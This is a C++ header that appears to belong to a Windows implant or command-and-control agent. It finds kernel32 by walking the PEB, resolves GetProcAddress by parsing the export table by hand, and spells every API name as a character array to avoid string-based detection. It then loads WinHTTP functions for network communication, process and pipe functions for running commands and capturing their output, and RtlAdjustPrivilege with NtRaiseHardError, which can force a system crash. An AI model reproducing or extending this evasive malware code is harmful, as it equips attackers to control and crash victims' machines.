#pragma once

#ifndef _API_H_
#define _API_H_
#include <stdint.h>
#include <windows.h>
#include <winhttp.h>
#include <winternl.h>

typedef FARPROC(WINAPI* _GetProcAddress)(HMODULE, const char *);
typedef HMODULE(WINAPI* _LoadLibraryA)(const char *);


typedef HINTERNET (WINAPI* _WinHttpOpen) (
	_In_opt_ LPCWSTR pszAgent,
	_In_     DWORD   dwAccessType,
	_In_opt_ LPCWSTR pszProxy,
	_In_opt_ LPCWSTR pszProxyBypass,
	_In_     DWORD   dwFlags
);
typedef HINTERNET (WINAPI* _WinHttpConnect) (
	_In_ HINTERNET     hSession,
	_In_ LPCWSTR       pswzServerName,
	_In_ INTERNET_PORT nServerPort,
	_In_ DWORD         dwReserved
);
typedef HINTERNET (WINAPI* _WinHttpOpenRequest) (
	_In_       HINTERNET hConnect,
	_In_       LPCWSTR   pwszVerb,
	_In_       LPCWSTR   pwszObjectName,
	_In_opt_   LPCWSTR   pwszVersion,
	_In_opt_   LPCWSTR   pwszReferrer,
	_In_opt_z_ LPCWSTR*  ppwszAcceptTypes,
	_In_       DWORD     dwFlags
);
typedef WINBOOL (WINAPI* _WinHttpAddRequestHeaders)(
  _In_ HINTERNET hRequest,
  _In_ LPCWSTR   lpszHeaders,
  _In_ DWORD     dwHeadersLength,
  _In_ DWORD     dwModifiers
);
typedef WINBOOL (WINAPI* _WinHttpSendRequest) (
	_In_                                   HINTERNET hRequest,
	_In_reads_opt_(dwHeadersLength)        LPCWSTR   lpszHeaders,
	_In_                                   DWORD     dwHeadersLength,
	_In_reads_bytes_opt_(dwOptionalLength) LPVOID    lpOptional,
	_In_                                   DWORD     dwOptionalLength,
	_In_                                   DWORD     dwTotalLength,
	_In_                                   DWORD_PTR dwContext
);
typedef WINBOOL (WINAPI* _WinHttpWriteData)(
  _In_  HINTERNET hRequest,
  _In_  LPCVOID   lpBuffer,
  _In_  DWORD     dwNumberOfBytesToWrite,
  _Out_ LPDWORD   lpdwNumberOfBytesWritten
);
typedef WINBOOL (WINAPI* _WinHttpReceiveResponse) (
	_In_     HINTERNET hRequest,
	_In_opt_ LPVOID    lpReserved
);
typedef WINBOOL (WINAPI* _WinHttpQueryHeaders) (
  _In_ 	   HINTERNET hRequest,
  _In_ 	   DWORD     dwInfoLevel,
  _In_opt_ LPCWSTR   pwszName,
  _Out_    LPVOID    lpBuffer,
  _Inout_  LPDWORD   lpdwBufferLength,
  _Inout_  LPDWORD   lpdwIndex
);
typedef WINBOOL (WINAPI* _WinHttpQueryDataAvailable) (
  _In_  HINTERNET hRequest,
  _Out_ LPDWORD   lpdwNumberOfBytesAvailable
);
typedef WINBOOL (WINAPI* _WinHttpReadData) (
	_In_                                      HINTERNET hRequest,
	_Out_writes_bytes_(dwNumberOfBytesToRead) LPVOID    lpBuffer,
	_In_                                      DWORD     dwNumberOfBytesToRead,
	_Out_                                     LPDWORD   lpdwNumberOfBytesRead
);
typedef WINBOOL (WINAPI* _WinHttpCloseHandle) (
	_In_ HINTERNET hInternet
);
typedef WINBOOL (WINAPI* _WinHttpSetOption) (
	_In_                             HINTERNET hInternet,
	_In_                             DWORD     dwOption,
	_In_reads_bytes_(dwBufferLength) LPVOID    lpBuffer,
	_In_                             DWORD     dwBufferLength
);
typedef WINBOOL (WINAPI* _WinHttpSetTimeouts) (
	_In_ HINTERNET,
	_In_ int,
	_In_ int,
	_In_ int,
	_In_ int
);


typedef WINBOOL (WINAPI* _CreatePipe) (
	PHANDLE hReadPipe,
	PHANDLE hWritePipe,
	LPSECURITY_ATTRIBUTES lpPipeAttributes,
	DWORD nSize
);
typedef WINBOOL (WINAPI* _CreateProcessA) (
	LPCSTR lpApplicationName,
	LPSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	WINBOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCSTR lpCurrentDirectory,
	LPSTARTUPINFOA lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
);
typedef WINBOOL (WINAPI* _CloseHandle) (HANDLE hObject);
typedef WINBOOL (WINAPI* _ReadFile) (
	HANDLE hFile,
	LPVOID lpBuffer,
	DWORD nNumberOfBytesToRead,
	LPDWORD lpNumberOfBytesRead,
	LPOVERLAPPED lpOverlapped
);
typedef DWORD (WINAPI* _WaitForSingleObject) (
	HANDLE hHandle,
	DWORD dwMilliseconds
);
typedef WINBOOL (WINAPI* _SetCurrentDirectoryA) (LPCSTR lpPathName);
typedef WINBOOL (WINAPI* _GetComputerNameW) (LPWSTR lpBuffer, LPDWORD nSize);
typedef DWORD (WINAPI* _GetCurrentProcessId) (VOID);


typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege) (
    ULONG    privilege,
    BOOLEAN  enable,
    BOOLEAN  currentThread,
    PBOOLEAN enabled
);
typedef NTSTATUS(NTAPI* _NtRaiseHardError) (
	NTSTATUS   error_status,
	ULONG      number_of_parameters,
	ULONG      unicode_string_parameter_mask,
	PULONG_PTR parameters,
	ULONG      response_option,
	PULONG     reponse
);

namespace Win32
{
	// ! must use this method to define the string, otherwise it will not work properly.
	// dll
	static char STR_NTDLL[10]                     = {'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', '\0'};
	static char STR_WINHTTP[12]                   = {'w', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', '\0'};


	static char STR_LOADLIBRARYA[13]              = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0'};
	static char STR_GETPROCADDRESS[15]            = {'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0'};

	// ntdll.dll
	static char STR_RTLADJUSTPRIVILEGE[19]        = {'R', 't', 'l', 'A', 'd', 'j', 'u', 's', 't', 'P', 'r', 'i', 'v', 'i', 'l', 'e', 'g', 'e', '\0'};
	static char STR_NTRAISEHARDERROR[17]          = {'N', 't', 'R', 'a', 'i', 's', 'e', 'H', 'a', 'r', 'd', 'E', 'r', 'r', 'o', 'r', '\0'};

	// winhttp.dll
	static char STR_WINHTTPOPEN[12] 		      = {'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', '\0'};
	static char STR_WINHTTPCONNECT[15]            = {'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', '\0'};
	static char STR_WINHTTPOPENREQUEST[19]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', '\0'};
	static char STR_WINHTTPADDREQUESTHEADERS[25]  = {'W', 'i', 'n', 'H', 't', 't', 'p', 'A', 'd', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 'H', 'e', 'a', 'd', 'e', 'r', 's', '\0'};
	static char STR_WINHTTPSENDREQUEST[19]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', '\0'};
	static char STR_WINHTTPWRITEDATA[17]          = {'W', 'i', 'n', 'H', 't', 't', 'p', 'W', 'r', 'i', 't', 'e', 'D', 'a', 't', 'a', '\0'};
	static char STR_WINHTTPRECEIVERESPONSE[23]    = {'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'c', 'e', 'i', 'v', 'e', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', '\0'};
	static char STR_WINHTTPQUERYHEADERS[20]       = {'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', 's', '\0'};
	static char STR_WINHTTPQUERYDATAAVAILABLE[26] = {'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'D', 'a', 't', 'a', 'A', 'v', 'a', 'i', 'l', 'a', 'b', 'l', 'e', '\0'};
	static char STR_WINHTTPREADDATA[16]           = {'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', '\0'};
	static char STR_WINHTTPCLOSEHANDLE[19]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
	static char STR_WINHTTPSETOPTION[17]          = {'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 't', 'O', 'p', 't', 'i', 'o', 'n', '\0'};
	static char STR_WINHTTPSETTIMEOUTS[]          = {'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 't', 'T', 'i', 'm', 'e', 'o', 'u', 't', 's', '\0'};

	// kernel32.dll
	static char STR_CREATEPIPE[]           = {'C', 'r', 'e', 'a', 't', 'e', 'P', 'i', 'p', 'e', '\0'};
	static char STR_CREATEPROCESSA[]       = {'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', '\0'};
	static char STR_READFILE[]             = {'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', '\0'};
	static char STR_CLOSEHANDLE[]          = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
	static char STR_WAITFORSINGLEOBJECT[]  = {'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', '\0'};
	static char STR_SETCURRENTDIRECTORYA[] = {'S', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'D', 'i', 'r', 'e', 'c', 't', 'o', 'r', 'y', 'A', '\0'};
	static char STR_GETCOMPUTERNAMEW[]     = {'G', 'e', 't', 'C', 'o', 'm', 'p', 'u', 't', 'e', 'r', 'N', 'a', 'm', 'e', 'W', '\0'};
	static char STR_GETCURRENTPROCESSID[]  = {'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'd', '\0'};
    
	static PVOID GetKernel32(void)
    {
        PEB*                  peb            = (PEB*)__readgsqword(0x60);
        LDR_DATA_TABLE_ENTRY* pKernel32Entry = CONTAINING_RECORD(peb->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        return pKernel32Entry->DllBase;
    }


    static _GetProcAddress GetGetProcAddress(void)
    {
        IMAGE_DOS_HEADER*       pDosHeader            = (IMAGE_DOS_HEADER*)GetKernel32();
        IMAGE_NT_HEADERS*       pNtHeaders            = (IMAGE_NT_HEADERS *)(pDosHeader->e_lfanew + (size_t)pDosHeader);
        IMAGE_EXPORT_DIRECTORY* pExportTable          = (IMAGE_EXPORT_DIRECTORY *)((size_t)pDosHeader + pNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
        const int32_t*          pNameTablesOffset     = (const int32_t *)((size_t)pDosHeader + pExportTable->AddressOfNames);
        const int16_t*          pOrdinalTablesOffset  = (const int16_t *)((size_t)pDosHeader + pExportTable->AddressOfNameOrdinals);
        const int32_t*          pAddressTablesOffset  = (const int32_t *)((size_t)pDosHeader + pExportTable->AddressOfFunctions);
        
        int i = 0;
        while(strcmp((char*)pDosHeader + pNameTablesOffset[i], STR_GETPROCADDRESS) != 0) {++i;}
        return (_GetProcAddress)((size_t)pDosHeader + pAddressTablesOffset[pOrdinalTablesOffset[i]]);
    }


    static HMODULE         Kernel32       = (HMODULE)GetKernel32();
    static _GetProcAddress GetProcAddress = GetGetProcAddress();
    static _LoadLibraryA   LoadLibraryA   = (_LoadLibraryA)GetProcAddress(Kernel32, STR_LOADLIBRARYA);
	
	static HMODULE Ntdll   = LoadLibraryA(STR_NTDLL);
	static HMODULE WinHttp = LoadLibraryA(STR_WINHTTP);

    static _WinHttpOpen               WinHttpOpen               = (_WinHttpOpen)GetProcAddress(WinHttp, STR_WINHTTPOPEN);
	static _WinHttpConnect            WinHttpConnect            = (_WinHttpConnect)GetProcAddress(WinHttp, STR_WINHTTPCONNECT);
	static _WinHttpOpenRequest        WinHttpOpenRequest        = (_WinHttpOpenRequest)GetProcAddress(WinHttp, STR_WINHTTPOPENREQUEST);
	static _WinHttpAddRequestHeaders  WinHttpAddRequestHeaders  = (_WinHttpAddRequestHeaders)GetProcAddress(WinHttp, STR_WINHTTPADDREQUESTHEADERS);
	static _WinHttpSendRequest        WinHttpSendRequest        = (_WinHttpSendRequest)GetProcAddress(WinHttp, STR_WINHTTPSENDREQUEST);
	static _WinHttpWriteData          WinHttpWriteData          = (_WinHttpWriteData)GetProcAddress(WinHttp, STR_WINHTTPWRITEDATA);
	static _WinHttpReceiveResponse    WinHttpReceiveResponse    = (_WinHttpReceiveResponse)GetProcAddress(WinHttp, STR_WINHTTPRECEIVERESPONSE);
	static _WinHttpQueryHeaders       WinHttpQueryHeaders       = (_WinHttpQueryHeaders)GetProcAddress(WinHttp, STR_WINHTTPQUERYHEADERS);
	static _WinHttpQueryDataAvailable WinHttpQueryDataAvailable = (_WinHttpQueryDataAvailable)GetProcAddress(WinHttp, STR_WINHTTPQUERYDATAAVAILABLE);
	static _WinHttpReadData           WinHttpReadData           = (_WinHttpReadData)GetProcAddress(WinHttp, STR_WINHTTPREADDATA);
	static _WinHttpCloseHandle        WinHttpCloseHandle        = (_WinHttpCloseHandle)GetProcAddress(WinHttp, STR_WINHTTPCLOSEHANDLE);
	static _WinHttpSetOption          WinHttpSetOption          = (_WinHttpSetOption)GetProcAddress(WinHttp, STR_WINHTTPSETOPTION);
	static _WinHttpSetTimeouts        WinHttpSetTimeouts        = (_WinHttpSetTimeouts)GetProcAddress(WinHttp, STR_WINHTTPSETTIMEOUTS);

	static _RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(Ntdll, STR_RTLADJUSTPRIVILEGE);
	static _NtRaiseHardError   NtRaiseHardError   = (_NtRaiseHardError)GetProcAddress(Ntdll, STR_NTRAISEHARDERROR);

	static _CreatePipe           CreatePipe           = (_CreatePipe)GetProcAddress(Kernel32, STR_CREATEPIPE);
	static _CreateProcessA       CreateProcessA       = (_CreateProcessA)GetProcAddress(Kernel32, STR_CREATEPROCESSA);
	static _ReadFile             ReadFile             = (_ReadFile)GetProcAddress(Kernel32, STR_READFILE);
	static _CloseHandle          CloseHandle          = (_CloseHandle)GetProcAddress(Kernel32, STR_CLOSEHANDLE);
	static _WaitForSingleObject  WaitForSingleObject  = (_WaitForSingleObject)GetProcAddress(Kernel32, STR_WAITFORSINGLEOBJECT);
	static _SetCurrentDirectoryA SetCurrentDirectoryA = (_SetCurrentDirectoryA)GetProcAddress(Kernel32, STR_SETCURRENTDIRECTORYA);
	static _GetComputerNameW     GetComputerNameW     = (_GetComputerNameW)GetProcAddress(Kernel32, STR_GETCOMPUTERNAMEW);
	static _GetCurrentProcessId  GetCurrentProcessId  = (_GetCurrentProcessId)GetProcAddress(Kernel32, STR_GETCURRENTPROCESSID);
} // namespace Win32

#endif
